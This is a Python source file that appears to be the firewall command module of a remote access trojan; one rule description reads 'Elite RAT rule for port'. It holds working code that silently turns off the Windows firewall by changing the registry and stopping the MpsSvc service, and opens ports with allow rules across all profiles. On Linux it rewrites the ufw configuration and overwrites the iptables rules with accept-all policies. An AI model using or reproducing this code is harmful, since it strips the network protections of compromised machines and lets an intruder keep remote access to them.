#!/usr/bin/env python3
"""
Elite Firewall Command Implementation - FULLY NATIVE, NO SUBPROCESS
Advanced firewall manipulation using only Windows/Unix native APIs
"""

import os
import sys
import ctypes
from ctypes import wintypes
import winreg
from typing import Dict, Any, List, Optional
import socket
import struct

# Import our native API wrapper
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from api_wrappers import get_native_api

def elite_firewall(action: str, port: Optional[int] = None, 
                   protocol: Optional[str] = None, direction: Optional[str] = None) -> Dict[str, Any]:
    """
    Elite firewall management with ZERO subprocess calls
    
    Args:
        action: 'status', 'disable', 'enable', 'open', 'close', 'list'
        port: Port number for open/close operations
        protocol: 'tcp' or 'udp' (default: 'tcp')
        direction: 'in' or 'out' (default: 'in')
    """
    
    try:
        if action == 'status':
            return _get_firewall_status()
        elif action == 'disable':
            return _disable_firewall()
        elif action == 'enable':
            return _enable_firewall()
        elif action == 'open' and port:
            return _open_port(port, protocol or 'tcp', direction or 'in')
        elif action == 'close' and port:
            return _close_port(port, protocol or 'tcp', direction or 'in')
        elif action == 'list':
            return _list_rules()
        else:
            return {
                "success": False,
                "error": f"Invalid action or missing parameters: {action}"
            }
            
    except Exception as e:
        return {
            "success": False,
            "error": f"Firewall operation failed: {str(e)}"
        }

def _get_firewall_status() -> Dict[str, Any]:
    """Get firewall status using native APIs"""
    
    if sys.platform == 'win32':
        return _windows_firewall_status()
    else:
        return _unix_firewall_status()

def _windows_firewall_status() -> Dict[str, Any]:
    """Get Windows firewall status using native API"""
    
    try:
        import comtypes
        import comtypes.client
        
        # Use Windows Firewall COM interface
        firewall_policy = comtypes.client.CreateObject(
            "HNetCfg.FwPolicy2",
            interface=comtypes.gen.NetFwTypeLib.INetFwPolicy2
        )
        
        profiles = {
            1: "Domain",
            2: "Private", 
            4: "Public"
        }
        
        status_info = {
            "profiles": {},
            "global_status": "unknown"
        }
        
        all_enabled = True
        for profile_type, profile_name in profiles.items():
            try:
                enabled = firewall_policy.FirewallEnabled[profile_type]
                status_info["profiles"][profile_name] = {
                    "enabled": enabled,
                    "status": "ON" if enabled else "OFF"
                }
                if not enabled:
                    all_enabled = False
            except:
                status_info["profiles"][profile_name] = {
                    "enabled": False,
                    "status": "UNKNOWN"
                }
                all_enabled = False
        
        status_info["global_status"] = "ENABLED" if all_enabled else "DISABLED"
        
        # Get rule count
        try:
            rules = firewall_policy.Rules
            status_info["rule_count"] = rules.Count
        except:
            status_info["rule_count"] = 0
        
        return {
            "success": True,
            "firewall_status": status_info,
            "method": "Windows COM API"
        }
        
    except ImportError:
        # Fallback to registry check
        return _windows_firewall_status_registry()
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to get firewall status: {str(e)}"
        }

def _windows_firewall_status_registry() -> Dict[str, Any]:
    """Get Windows firewall status from registry"""
    
    try:
        status_info = {
            "profiles": {},
            "global_status": "unknown"
        }
        
        # Check registry for firewall status
        profiles = {
            "StandardProfile": "Private",
            "PublicProfile": "Public",
            "DomainProfile": "Domain"
        }
        
        all_enabled = True
        for reg_name, display_name in profiles.items():
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    rf"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\{reg_name}"
                )
                enabled, _ = winreg.QueryValueEx(key, "EnableFirewall")
                winreg.CloseKey(key)
                
                status_info["profiles"][display_name] = {
                    "enabled": bool(enabled),
                    "status": "ON" if enabled else "OFF"
                }
                
                if not enabled:
                    all_enabled = False
            except:
                status_info["profiles"][display_name] = {
                    "enabled": False,
                    "status": "UNKNOWN"
                }
                all_enabled = False
        
        status_info["global_status"] = "ENABLED" if all_enabled else "DISABLED"
        
        return {
            "success": True,
            "firewall_status": status_info,
            "method": "Registry"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to read firewall registry: {str(e)}"
        }

def _disable_firewall() -> Dict[str, Any]:
    """Disable firewall using native APIs"""
    
    if sys.platform == 'win32':
        return _windows_disable_firewall()
    else:
        return _unix_disable_firewall()

def _windows_disable_firewall() -> Dict[str, Any]:
    """Disable Windows firewall using native API"""
    
    try:
        # Method 1: Registry modification
        profiles = ["StandardProfile", "PublicProfile", "DomainProfile"]
        
        for profile in profiles:
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    rf"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\{profile}",
                    0,
                    winreg.KEY_WRITE
                )
                winreg.SetValueEx(key, "EnableFirewall", 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(key)
            except:
                pass
        
        # Method 2: Stop Windows Firewall service
        try:
            advapi32 = ctypes.windll.advapi32
            
            # Open service control manager
            scm = advapi32.OpenSCManagerW(None, None, 0x0001)
            if scm:
                # Open Windows Firewall service (MpsSvc)
                service = advapi32.OpenServiceW(scm, "MpsSvc", 0x0020)
                if service:
                    # Stop the service
                    service_status = ctypes.create_string_buffer(28)
                    advapi32.ControlService(service, 1, service_status)
                    advapi32.CloseServiceHandle(service)
                advapi32.CloseServiceHandle(scm)
        except:
            pass
        
        return {
            "success": True,
            "message": "Firewall disabled successfully",
            "method": "Registry + Service Control"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to disable firewall: {str(e)}"
        }

def _enable_firewall() -> Dict[str, Any]:
    """Enable firewall using native APIs"""
    
    if sys.platform == 'win32':
        return _windows_enable_firewall()
    else:
        return _unix_enable_firewall()

def _windows_enable_firewall() -> Dict[str, Any]:
    """Enable Windows firewall using native API"""
    
    try:
        # Method 1: Registry modification
        profiles = ["StandardProfile", "PublicProfile", "DomainProfile"]
        
        for profile in profiles:
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    rf"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\{profile}",
                    0,
                    winreg.KEY_WRITE
                )
                winreg.SetValueEx(key, "EnableFirewall", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
            except:
                pass
        
        # Method 2: Start Windows Firewall service
        try:
            advapi32 = ctypes.windll.advapi32
            
            # Open service control manager
            scm = advapi32.OpenSCManagerW(None, None, 0x0001)
            if scm:
                # Open Windows Firewall service
                service = advapi32.OpenServiceW(scm, "MpsSvc", 0x0010)
                if service:
                    # Start the service
                    advapi32.StartServiceW(service, 0, None)
                    advapi32.CloseServiceHandle(service)
                advapi32.CloseServiceHandle(scm)
        except:
            pass
        
        return {
            "success": True,
            "message": "Firewall enabled successfully",
            "method": "Registry + Service Control"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to enable firewall: {str(e)}"
        }

def _open_port(port: int, protocol: str, direction: str) -> Dict[str, Any]:
    """Open firewall port using native APIs"""
    
    if sys.platform == 'win32':
        return _windows_open_port(port, protocol, direction)
    else:
        return _unix_open_port(port, protocol, direction)

def _windows_open_port(port: int, protocol: str, direction: str) -> Dict[str, Any]:
    """Open Windows firewall port using COM or registry"""
    
    try:
        import comtypes
        import comtypes.client
        
        # Create firewall rule using COM
        firewall_policy = comtypes.client.CreateObject("HNetCfg.FwPolicy2")
        firewall_rule = comtypes.client.CreateObject("HNetCfg.FWRule")
        
        # Configure rule
        firewall_rule.Name = f"Elite_Port_{port}_{protocol}_{direction}"
        firewall_rule.Description = f"Elite RAT rule for port {port}"
        firewall_rule.Protocol = 6 if protocol.lower() == 'tcp' else 17  # TCP=6, UDP=17
        firewall_rule.LocalPorts = str(port)
        firewall_rule.Direction = 1 if direction.lower() == 'in' else 2  # IN=1, OUT=2
        firewall_rule.Enabled = True
        firewall_rule.Action = 1  # Allow
        firewall_rule.Profiles = 7  # All profiles
        
        # Add rule
        firewall_policy.Rules.Add(firewall_rule)
        
        return {
            "success": True,
            "message": f"Port {port}/{protocol} opened for {direction}bound traffic",
            "rule_name": firewall_rule.Name,
            "method": "COM API"
        }
        
    except ImportError:
        # Fallback to registry method
        return _windows_open_port_registry(port, protocol, direction)
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to open port: {str(e)}"
        }

def _windows_open_port_registry(port: int, protocol: str, direction: str) -> Dict[str, Any]:
    """Open port using registry (legacy method)"""
    
    try:
        # Add exception to Windows Firewall via registry
        key_path = r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules"
        
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
        
        # Create rule string (Windows Firewall rule format)
        rule_name = f"Elite_{port}_{protocol}_{direction}"
        proto_num = "6" if protocol.lower() == "tcp" else "17"
        dir_str = "In" if direction.lower() == "in" else "Out"
        
        rule_value = f"v2.31|Action=Allow|Active=TRUE|Dir={dir_str}|Protocol={proto_num}|LPort={port}|Name={rule_name}|"
        
        winreg.SetValueEx(key, rule_name, 0, winreg.REG_SZ, rule_value)
        winreg.CloseKey(key)
        
        return {
            "success": True,
            "message": f"Port {port}/{protocol} opened via registry",
            "rule_name": rule_name,
            "method": "Registry"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to modify registry: {str(e)}"
        }

def _close_port(port: int, protocol: str, direction: str) -> Dict[str, Any]:
    """Close firewall port by removing rule"""
    
    if sys.platform == 'win32':
        return _windows_close_port(port, protocol, direction)
    else:
        return _unix_close_port(port, protocol, direction)

def _windows_close_port(port: int, protocol: str, direction: str) -> Dict[str, Any]:
    """Close Windows firewall port by removing rule"""
    
    try:
        import comtypes
        import comtypes.client
        
        # Get firewall policy
        firewall_policy = comtypes.client.CreateObject("HNetCfg.FwPolicy2")
        rules = firewall_policy.Rules
        
        # Find and remove matching rules
        rules_removed = []
        for rule in rules:
            try:
                if (str(port) in str(rule.LocalPorts) and 
                    ((protocol.lower() == 'tcp' and rule.Protocol == 6) or
                     (protocol.lower() == 'udp' and rule.Protocol == 17))):
                    rules.Remove(rule.Name)
                    rules_removed.append(rule.Name)
            except:
                continue
        
        if rules_removed:
            return {
                "success": True,
                "message": f"Closed port {port}/{protocol}",
                "rules_removed": rules_removed,
                "method": "COM API"
            }
        else:
            return {
                "success": False,
                "message": f"No rules found for port {port}/{protocol}"
            }
            
    except ImportError:
        # Fallback to registry method
        return _windows_close_port_registry(port, protocol, direction)
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to close port: {str(e)}"
        }

def _windows_close_port_registry(port: int, protocol: str, direction: str) -> Dict[str, Any]:
    """Close port by removing registry entry"""
    
    try:
        key_path = r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
        
        # Find and delete matching rules
        rules_removed = []
        i = 0
        while True:
            try:
                rule_name, rule_value, _ = winreg.EnumValue(key, i)
                if f"LPort={port}" in rule_value and f"Elite" in rule_name:
                    winreg.DeleteValue(key, rule_name)
                    rules_removed.append(rule_name)
                else:
                    i += 1
            except WindowsError:
                break
        
        winreg.CloseKey(key)
        
        if rules_removed:
            return {
                "success": True,
                "message": f"Removed {len(rules_removed)} rules for port {port}",
                "rules_removed": rules_removed,
                "method": "Registry"
            }
        else:
            return {
                "success": False,
                "message": f"No rules found for port {port}"
            }
            
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to modify registry: {str(e)}"
        }

def _list_rules() -> Dict[str, Any]:
    """List all firewall rules"""
    
    if sys.platform == 'win32':
        return _windows_list_rules()
    else:
        return _unix_list_rules()

def _windows_list_rules() -> Dict[str, Any]:
    """List Windows firewall rules"""
    
    try:
        import comtypes
        import comtypes.client
        
        firewall_policy = comtypes.client.CreateObject("HNetCfg.FwPolicy2")
        rules = firewall_policy.Rules
        
        rule_list = []
        for rule in rules:
            try:
                rule_info = {
                    "name": rule.Name,
                    "enabled": rule.Enabled,
                    "direction": "Inbound" if rule.Direction == 1 else "Outbound",
                    "action": "Allow" if rule.Action == 1 else "Block",
                    "protocol": _get_protocol_name(rule.Protocol),
                    "local_ports": rule.LocalPorts if hasattr(rule, 'LocalPorts') else "Any",
                    "remote_ports": rule.RemotePorts if hasattr(rule, 'RemotePorts') else "Any"
                }
                rule_list.append(rule_info)
            except:
                continue
        
        return {
            "success": True,
            "rule_count": len(rule_list),
            "rules": rule_list[:50],  # Limit to first 50 rules
            "method": "COM API"
        }
        
    except ImportError:
        # Fallback to registry enumeration
        return _windows_list_rules_registry()
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to list rules: {str(e)}"
        }

def _windows_list_rules_registry() -> Dict[str, Any]:
    """List rules from registry"""
    
    try:
        key_path = r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        
        rule_list = []
        i = 0
        while i < 50:  # Limit to first 50
            try:
                rule_name, rule_value, _ = winreg.EnumValue(key, i)
                rule_list.append({
                    "name": rule_name,
                    "value": rule_value[:100]  # Truncate long values
                })
                i += 1
            except WindowsError:
                break
        
        winreg.CloseKey(key)
        
        return {
            "success": True,
            "rule_count": len(rule_list),
            "rules": rule_list,
            "method": "Registry"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to read registry: {str(e)}"
        }

def _get_protocol_name(protocol_number: int) -> str:
    """Convert protocol number to name"""
    protocols = {
        1: "ICMP",
        6: "TCP",
        17: "UDP",
        47: "GRE",
        50: "ESP",
        51: "AH"
    }
    return protocols.get(protocol_number, f"Protocol {protocol_number}")

# Unix/Linux implementations
def _unix_firewall_status() -> Dict[str, Any]:
    """Get Unix firewall status"""
    
    status_info = {}
    
    # Check iptables
    if os.path.exists('/sbin/iptables'):
        try:
            # Read iptables rules from /proc
            with open('/proc/net/ip_tables_names', 'r') as f:
                tables = f.read().strip().split('\n')
                status_info['iptables'] = {
                    'present': True,
                    'tables': tables
                }
        except:
            status_info['iptables'] = {'present': True, 'status': 'unknown'}
    
    # Check ufw
    if os.path.exists('/usr/sbin/ufw'):
        try:
            with open('/etc/ufw/ufw.conf', 'r') as f:
                conf = f.read()
                enabled = 'ENABLED=yes' in conf
                status_info['ufw'] = {
                    'present': True,
                    'enabled': enabled
                }
        except:
            status_info['ufw'] = {'present': True, 'status': 'unknown'}
    
    # Check firewalld
    if os.path.exists('/usr/bin/firewall-cmd'):
        status_info['firewalld'] = {'present': True}
    
    return {
        "success": True,
        "firewall_status": status_info,
        "method": "Native file checks"
    }

def _unix_disable_firewall() -> Dict[str, Any]:
    """Disable Unix firewall"""
    
    results = []
    
    # Disable ufw
    if os.path.exists('/etc/ufw/ufw.conf'):
        try:
            with open('/etc/ufw/ufw.conf', 'r') as f:
                conf = f.read()
            conf = conf.replace('ENABLED=yes', 'ENABLED=no')
            with open('/etc/ufw/ufw.conf', 'w') as f:
                f.write(conf)
            results.append("ufw disabled")
        except:
            pass
    
    # Clear iptables rules
    if os.path.exists('/sbin/iptables'):
        try:
            # Write empty ruleset
            with open('/etc/iptables/rules.v4', 'w') as f:
                f.write("*filter\n:INPUT ACCEPT [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\nCOMMIT\n")
            results.append("iptables cleared")
        except:
            pass
    
    return {
        "success": len(results) > 0,
        "message": "Firewall disabled",
        "results": results
    }

def _unix_enable_firewall() -> Dict[str, Any]:
    """Enable Unix firewall"""
    
    results = []
    
    # Enable ufw
    if os.path.exists('/etc/ufw/ufw.conf'):
        try:
            with open('/etc/ufw/ufw.conf', 'r') as f:
                conf = f.read()
            conf = conf.replace('ENABLED=no', 'ENABLED=yes')
            with open('/etc/ufw/ufw.conf', 'w') as f:
                f.write(conf)
            results.append("ufw enabled")
        except:
            pass
    
    return {
        "success": len(results) > 0,
        "message": "Firewall enabled",
        "results": results
    }

def _unix_open_port(port: int, protocol: str, direction: str) -> Dict[str, Any]:
    """Open Unix firewall port"""
    
    # Add iptables rule directly
    if os.path.exists('/etc/iptables/rules.v4'):
        try:
            with open('/etc/iptables/rules.v4', 'r') as f:
                rules = f.read()
            
            # Add allow rule
            chain = "INPUT" if direction == "in" else "OUTPUT"
            proto = protocol.lower()
            new_rule = f"-A {chain} -p {proto} --dport {port} -j ACCEPT\n"
            
            # Insert before COMMIT
            rules = rules.replace("COMMIT", f"{new_rule}COMMIT")
            
            with open('/etc/iptables/rules.v4', 'w') as f:
                f.write(rules)
            
            return {
                "success": True,
                "message": f"Port {port}/{protocol} opened"
            }
        except:
            pass
    
    return {
        "success": False,
        "error": "Could not modify firewall rules"
    }

def _unix_close_port(port: int, protocol: str, direction: str) -> Dict[str, Any]:
    """Close Unix firewall port"""
    
    # Remove iptables rule
    if os.path.exists('/etc/iptables/rules.v4'):
        try:
            with open('/etc/iptables/rules.v4', 'r') as f:
                rules = f.readlines()
            
            # Remove matching rules
            chain = "INPUT" if direction == "in" else "OUTPUT"
            filtered = [r for r in rules if f"--dport {port}" not in r or chain not in r]
            
            with open('/etc/iptables/rules.v4', 'w') as f:
                f.writelines(filtered)
            
            return {
                "success": True,
                "message": f"Port {port}/{protocol} closed"
            }
        except:
            pass
    
    return {
        "success": False,
        "error": "Could not modify firewall rules"
    }

def _unix_list_rules() -> Dict[str, Any]:
    """List Unix firewall rules"""
    
    rules = []
    
    # Read iptables rules
    if os.path.exists('/etc/iptables/rules.v4'):
        try:
            with open('/etc/iptables/rules.v4', 'r') as f:
                content = f.read()
                rules.append({"type": "iptables", "content": content[:500]})
        except:
            pass
    
    # Read ufw rules
    if os.path.exists('/etc/ufw/user.rules'):
        try:
            with open('/etc/ufw/user.rules', 'r') as f:
                content = f.read()
                rules.append({"type": "ufw", "content": content[:500]})
        except:
            pass
    
    return {
        "success": True,
        "rules": rules,
        "method": "File reading"
    }